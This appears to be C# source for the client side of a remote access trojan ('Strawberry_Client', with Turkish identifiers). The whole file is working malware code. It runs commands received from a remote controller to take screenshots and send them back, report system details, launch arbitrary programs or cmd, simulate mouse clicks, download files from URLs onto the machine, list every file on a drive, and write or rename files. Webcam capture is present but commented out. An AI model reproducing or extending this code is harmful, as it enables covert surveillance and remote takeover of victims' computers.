using Microsoft.VisualBasic.Devices;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Management;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
//using AForge.Video.DirectShow;
//using AForge.Video;

namespace Strawberry_Client.Baglanti
{
    public class Handler
    {
        //public static FilterInfoCollection videoDevices = new FilterInfoCollection(FilterCategory.VideoInputDevice);

        //public static VideoCaptureDevice videoSource = new VideoCaptureDevice(videoDevices[0].MonikerString);

        public static void ayarla()
        {
            // set NewFrame event handler
            //videoSource.NewFrame += new NewFrameEventHandler(video_yeniframegeldi);
        }

        public static void komuthandle(byte[] komutdata, Dictionary<object, object> metadata)
        {
            string komut = Encoding.UTF8.GetString(komutdata); //byte[]'ı stringe çevirdik

            string[] parcalar = komut.Split(':');

            if (komut == "sistembilgisi")
            {
                ComputerInfo cinfo = new ComputerInfo();
                string islemciadi = "Tanımsız";

                using (ManagementObjectSearcher win32Proc = new ManagementObjectSearcher("select * from Win32_Processor"), win32CompSys = new ManagementObjectSearcher("select * from Win32_ComputerSystem"), win32Memory = new ManagementObjectSearcher("select * from Win32_PhysicalMemory"))
                {
                    foreach (ManagementObject obj in win32Proc.Get())
                    {
                        islemciadi = obj["Name"].ToString();
                    }
                }

                Program.client.Send("sistembilgisi:" + cinfo.TotalPhysicalMemory + ":" + islemciadi);
            }

            if (komut == "baglantiyikes")
            {
                Environment.Exit(0); 
            }

            if (komut == "ekrangonder")
            {
                Image ekran = Araclar.EkranResmiAl(true);

                byte[] resimbytearray;

                ImageConverter imgCon = new ImageConverter();
                resimbytearray = (byte[])imgCon.ConvertTo(ekran, typeof(byte[]));

                Program.client.Send(resimbytearray);
            }

            if (komut == "kamerabaslat")
            {
                //videoSource.Start();
            }

            if (komut == "kameradurdur")
            {
                //videoSource.SignalToStop();
            }

            if (parcalar[0] == "mesajbox")
            {
                if (parcalar[3] == "Ünlem")
                {
                    MessageBox.Show(parcalar[1], parcalar[2], MessageBoxButtons.OK, MessageBoxIcon.Warning);
                }

                if (parcalar[3] == "Info")
                {
                    MessageBox.Show(parcalar[1], parcalar[2], MessageBoxButtons.OK, MessageBoxIcon.Information);
                }

                if (parcalar[3] == "Error")
                {
                    MessageBox.Show(parcalar[1], parcalar[2], MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
            }

            if (parcalar[0] == "baslat")
            {
                if (parcalar[1] == "cmd")
                {
                    Process pr = new Process();
                    pr.StartInfo.WorkingDirectory = @"C:\";
                    pr.StartInfo.FileName = "cmd.exe";

                    pr.Start();
                }
                else
                {
                    string[] sadece1kerekesilmisparcalar = komut.Split(new char[] { ':' }, 2, StringSplitOptions.None);

                    Process.Start(sadece1kerekesilmisparcalar[1]);
                }
            }

            if (parcalar[0] == "tikla")
            {
                Araclar.LeftMouseClick(Convert.ToInt32(parcalar[1]), Convert.ToInt32(parcalar[2]));
            }

            if (parcalar[0] == "indir")
            {
                string[] sadece1kerekesilmisparcalar = komut.Split(new char[] { ':' }, 3, StringSplitOptions.None);

                using (WebClient wc = new WebClient())
                {
                    wc.DownloadFile(sadece1kerekesilmisparcalar[1], sadece1kerekesilmisparcalar[2]);
                }
            }

            if (parcalar[0] == "listele")
            {
                

                string[] sadece1kerekesilmisparcalar = komut.Split(new char[] { ':' }, 2, StringSplitOptions.None);

                Dictionary<object, object> mtdt = new Dictionary<object, object>();

                var liste = Araclar.GetFiles(sadece1kerekesilmisparcalar[1], "*.*");

                foreach (var item in liste)
                {
                    FileAttributes attr = File.GetAttributes(item);

                    if (attr.HasFlag(FileAttributes.Directory))
                    {
                        mtdt.Add(item, "Klasor");
                    }
                    else
                    {
                        mtdt.Add(item, "Dosya");
                    }   
                }

                Program.client.Send("klasorliste", mtdt);
            }

            if (metadata != null)
            {
                if (metadata.Keys.First().ToString() == "dosyayukle")
                {
                    string kydd = Path.Combine(metadata.Keys.Last().ToString(), metadata.Values.Last().ToString());

                    if (!File.Exists(kydd))
                    {
                        File.Create(kydd).Dispose();

                        File.WriteAllBytes(kydd, komutdata);
                    }
                }

                if (komut == "dosyayenidenadlandir")
                {
                    File.Move(metadata.Keys.First().ToString(), metadata.Values.First().ToString());
                }
            }
        }

        /*
        public static void video_yeniframegeldi(object sender, NewFrameEventArgs args)
        {
            Image resim = args.Frame;
            
            lock (resim)
            {
                byte[] resimbytearray;

                ImageConverter imgCon = new ImageConverter();
                resimbytearray = (byte[])imgCon.ConvertTo(resim, typeof(byte[]));

                Program.client.Send(resimbytearray);
            }
        }
        */
        
    }

    public class Araclar
    {
        [StructLayout(LayoutKind.Sequential)]
        struct CURSORINFO
        {
            public Int32 cbSize;
            public Int32 flags;
            public IntPtr hCursor;
            public POINTAPI ptScreenPos;
        }

        [StructLayout(LayoutKind.Sequential)]
        struct POINTAPI
        {
            public int x;
            public int y;
        }

        [DllImport("user32.dll")]
        static extern bool GetCursorInfo(out CURSORINFO pci);

        [DllImport("user32.dll")]
        static extern bool DrawIcon(IntPtr hDC, int X, int Y, IntPtr hIcon);

        const Int32 CURSOR_SHOWING = 0x00000001;

        public static Bitmap EkranResmiAl(bool CaptureMouse)
        {
            Bitmap result = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height, System.Drawing.Imaging.PixelFormat.Format24bppRgb);

            try
            {
                using (Graphics g = Graphics.FromImage(result))
                {
                    g.CopyFromScreen(0, 0, 0, 0, Screen.PrimaryScreen.Bounds.Size, CopyPixelOperation.SourceCopy);

                    if (CaptureMouse)
                    {
                        CURSORINFO pci;
                        pci.cbSize = System.Runtime.InteropServices.Marshal.SizeOf(typeof(CURSORINFO));

                        if (GetCursorInfo(out pci))
                        {
                            if (pci.flags == CURSOR_SHOWING)
                            {
                                DrawIcon(g.GetHdc(), pci.ptScreenPos.x, pci.ptScreenPos.y, pci.hCursor);
                                g.ReleaseHdc();
                            }
                        }
                    }
                }
            }
            catch
            {
                result = null;
            }

            return result;
        }

        [DllImport("user32.dll")]
        static extern bool SetCursorPos(int x, int y);

        [DllImport("user32.dll")]
        public static extern void mouse_event(int dwFlags, int dx, int dy, int cButtons, int dwExtraInfo);

        public const int MOUSEEVENTF_LEFTDOWN = 0x02;
        public const int MOUSEEVENTF_LEFTUP = 0x04;

        public static void LeftMouseClick(int xpos, int ypos)
        {
            SetCursorPos(xpos, ypos);
            mouse_event(MOUSEEVENTF_LEFTDOWN, xpos, ypos, 0, 0);
            Thread.Sleep(50);
            mouse_event(MOUSEEVENTF_LEFTUP, xpos, ypos, 0, 0);
        }

        public static IEnumerable<string> GetFiles(string root, string searchPattern)
        {
            Stack<string> pending = new Stack<string>();
            pending.Push(root);
            while (pending.Count != 0)
            {
                var path = pending.Pop();
                string[] next = null;
                try
                {
                    next = Directory.GetFiles(path, searchPattern);
                }
                catch { }
                if (next != null && next.Length != 0)
                    foreach (var file in next) yield return file;
                try
                {
                    next = Directory.GetDirectories(path);
                    foreach (var subdir in next) pending.Push(subdir);
                }
                catch { }
            }
        }
    }
}
